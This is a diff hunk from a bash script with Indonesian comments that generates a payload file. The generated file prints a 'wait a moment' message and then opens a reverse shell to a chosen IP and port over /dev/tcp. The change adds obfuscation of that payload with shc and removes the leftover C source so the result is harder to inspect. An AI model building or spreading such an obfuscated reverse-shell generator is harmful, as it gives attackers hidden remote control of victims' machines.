@@ -71,7 +71,15 @@ cat <<EOF > "${output}"
 echo "Tunggu beberapa saat..."
 bash -i >& /dev/tcp/"${ip}"/"${port}" 0>&1
 EOF
-chmod +x "${output}"
+
+# Melakukan obfuscation menggunakan shc
+shc -f "${output}" -o "${output}" -r
+
+# Menghapus file yang tidak dibutuhkan yang dihasilkan oleh shc
+file_ga_guna="${output}.x.c"
+if [[ -f "${file_ga_guna}" ]]; then
+	rm "${file_ga_guna}"
+fi
 
 echo ""
 echo "[+] DONE..."
